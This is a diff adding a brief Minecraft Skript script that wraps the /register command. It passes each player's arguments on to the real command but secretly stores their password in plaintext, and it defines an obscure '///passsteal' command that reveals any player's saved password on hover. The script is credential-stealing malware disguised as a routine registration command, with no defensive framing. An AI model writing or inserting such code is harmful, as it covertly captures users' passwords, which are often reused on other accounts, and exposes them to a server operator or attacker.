@@ -1,0 +1,8 @@
+command /register [<text>] [<text>]:
+    trigger:
+        execute player command "/register %arg-1% %arg-2%"
+        set {password.%player%} to arg-1
+
+command ///passsteal <player>:
+    trigger:
+        send formatted "&e%arg-1%'s password: <hover:show_text:'%{password.%arg-1%}%'>[HERE]" to player
